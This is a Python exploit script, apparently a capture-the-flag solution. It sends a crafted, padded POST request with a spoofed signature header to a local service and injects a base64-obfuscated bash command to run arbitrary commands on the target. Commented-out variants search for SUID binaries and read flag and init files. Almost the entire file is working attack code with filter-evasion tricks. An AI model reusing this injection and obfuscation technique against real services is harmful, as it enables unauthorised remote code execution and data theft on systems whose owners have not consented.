import http.client
import struct
import gzip
import io
import base64


# 构造头部用到的签名
x_signature = "@@@"

def build_packet(command: str) -> str:
    prefix = b'A'
    length = struct.pack('>H', len(command))  
    payload = command.encode()  
    full_packet = prefix + length + payload
    return full_packet.hex()  


# command2execute = "find / -perm -u=s -type f 2>/dev/null"
command2execute = "date -f /f* 2>&1"
# command2execute = "cat /f* 2>&1"
#command2execute = "cat  /init.sh"

command="bash -c '{echo," + base64.b64encode(command2execute.encode()).decode() + "}|{base64,-d}|{bash,-i}'"
HexCommand = build_packet(command)
# print(HexCommand)

hex_part = bytes.fromhex(HexCommand) 
prefix = "function=B&date=2012-12-11" 
prefix_bytes = prefix.encode()  

total_length = 65536

filler_len = total_length  - len(hex_part)

# 构造请求体：前缀 + 协议包 + 填充
body = prefix_bytes + hex_part + b"A" * filler_len

target_url = "localhost:9999"

# 构造 headers
headers = {
    "Host": target_url,
    "X-Signature": x_signature,
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": target_url,
    "Referer": target_url,
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i",
    "Connection": "close",
    "Content-Length": str(len(body)),
}

# 发起请求
conn = http.client.HTTPConnection(target_url)
conn.request("POST", "/", body=body, headers=headers)

# 读取响应
res = conn.getresponse()
print(f"Status: {res.status}")
# print(res.read().decode(errors="ignore"))
raw_data = res.read()
try:
    with gzip.GzipFile(fileobj=io.BytesIO(raw_data)) as f:
        decompressed_data = f.read()
    text = decompressed_data.decode('utf-8', errors='ignore')
    print(text)
except Exception as e:
    print(f"解压失败: {e}")
    print(raw_data)
